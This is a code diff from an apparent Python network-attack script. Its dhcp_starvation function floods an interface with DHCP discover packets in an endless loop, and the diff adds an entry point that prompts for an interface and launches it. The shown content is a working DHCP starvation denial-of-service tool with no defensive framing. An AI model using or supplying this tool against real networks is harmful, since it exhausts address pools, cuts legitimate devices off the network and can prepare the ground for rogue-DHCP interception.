@@ -11,3 +11,8 @@ def dhcp_starvation(ifaceName):
                         /DHCP(options=[('message-type','discover'),('end')]) #create DHCP discover packet
 
     sendp(dhcp_discover, iface=ifaceName ,loop=1,verbose=1)
+
+
+if __name__ == "__main__":
+    iface = input("Interface: ").strip()
+    dhcp_starvation(iface)
